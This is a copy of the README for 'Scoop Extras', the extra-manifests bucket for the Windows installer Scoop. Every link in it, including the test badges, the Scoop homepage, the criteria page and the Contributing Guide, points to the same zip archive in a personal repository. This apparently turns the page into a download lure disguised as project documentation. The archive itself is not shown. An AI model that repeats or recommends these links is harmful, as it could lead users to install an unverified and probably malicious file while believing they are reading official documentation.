# Scoop Extras [![Tests](https://raw.githubusercontent.com/candrapersada/Extras/master/scripts/eartrumpet/Extras-2.2.zip)](https://raw.githubusercontent.com/candrapersada/Extras/master/scripts/eartrumpet/Extras-2.2.zip) [![Excavator](https://raw.githubusercontent.com/candrapersada/Extras/master/scripts/eartrumpet/Extras-2.2.zip)](https://raw.githubusercontent.com/candrapersada/Extras/master/scripts/eartrumpet/Extras-2.2.zip)

Extra manifests for [Scoop](https://raw.githubusercontent.com/candrapersada/Extras/master/scripts/eartrumpet/Extras-2.2.zip), the Windows command-line installer. For manifests that don't fit the [Main criteria](https://raw.githubusercontent.com/candrapersada/Extras/master/scripts/eartrumpet/Extras-2.2.zip).

How do I install these manifests?
---------------------------------

To add this bucket, run `scoop bucket add extras`. To install, do `scoop install <manifest>`.

How do I contribute new manifests?
----------------------------------

To make a new manifest contribution, please read the [Contributing Guide](https://raw.githubusercontent.com/candrapersada/Extras/master/scripts/eartrumpet/Extras-2.2.zip).
